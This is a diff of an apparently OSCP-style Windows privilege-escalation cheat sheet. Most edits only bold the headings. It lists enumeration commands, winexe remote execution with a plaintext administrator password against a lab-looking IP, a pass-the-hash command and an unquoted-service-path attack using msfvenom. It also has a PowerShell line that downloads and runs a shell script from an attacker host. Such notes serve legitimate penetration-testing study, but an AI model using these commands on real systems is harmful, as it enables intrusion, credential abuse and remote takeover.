@@ -485,34 +485,34 @@ https://book.hacktricks.xyz/linux-unix/privilege-escalation
 ```diff
 -WIP
 ```
-Check permission with ```whoami /all```
+**Check permission with** ```whoami /all```
 
-Check general host information with ```systeminfo; net users; netstat -ano; ipconfig /all; tasklist```
+**Check general host information with** ```systeminfo; net users; netstat -ano; ipconfig /all; tasklist```
 
 
 
-Auto enumerate with (enum script of choice here:) ```winPEAS.exe```
+**Auto enumerate with (enum script of choice here:)** ```winPEAS.exe```
 
-Check loaded libraries --> potential DLL hijacking
+**Check loaded libraries --> potential DLL hijacking**
 
-Execute command remotely on Remote Windows target via SMB Creds with winexe or psexec.py from Local Kali machine
+**Execute command remotely on Remote Windows target via SMB Creds with winexe or psexec.py from Local Kali machine**
 ```
 winexe -U 'user%password' //$RHOST powershell.exe
 winexe -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 powershell.exe
 ```
 
-If NTLM hash is accquired -> can perform Pass The Hash attack with path-winexe
+**If NTLM hash is accquired -> can perform Pass The Hash attack with path-winexe**
 ```
 pth-winexe -U user%<LM Hash>:<NT Hash> //$RHOST cmd
 ```
 
-To view Access Control List of a directory:
+**To view Access Control List of a directory:**
 ```Get-ACL $FILEPATH | fl *```
 
-Can set ACL with:
+**Can set ACL with:**
 ```icacls "$PATH" /grant $USER:F /T```
 
-Check for unquoted service path:
+**Check for unquoted service path:**
 If the path contains a space and is not quoted, the service is vulnerable.
 E.g.:
 ```C:\Program Files\Box\run.exe```
@@ -522,7 +522,7 @@ It can be exploited by dropping a payload called ```program.exe``` on ```C:\prog
 Payload can be generated with ```msfvenom```, once the service is manually restarted or after rebooting, ```program.exe``` will be executed.
 
 
-If autologon credential is captured. We can try to log in as admin:
+**If autologon credential is captured. We can try to log in as admin:**
 
 ```$newPass = ConvertTo-SecureString '$FOUNDPASSWORD' -AsPlainText -Force```
 
@@ -532,10 +532,8 @@ Set up a new listener on local Kali, and get a new PowerShell session from remot
 
 ```Start-Process -FilePath “powershell” -argumentlist “IEX(New-Object Net.WebClient).downloadString(‘$LHOST/shell.ps1’)” -Credential $newCred```
 
+
 https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#privilege-escalation
-
-WinPEAS.exe
-
 https://butter0verflow.github.io/oscp/OSCP-WindowsPrivEsc-Part1/
 https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
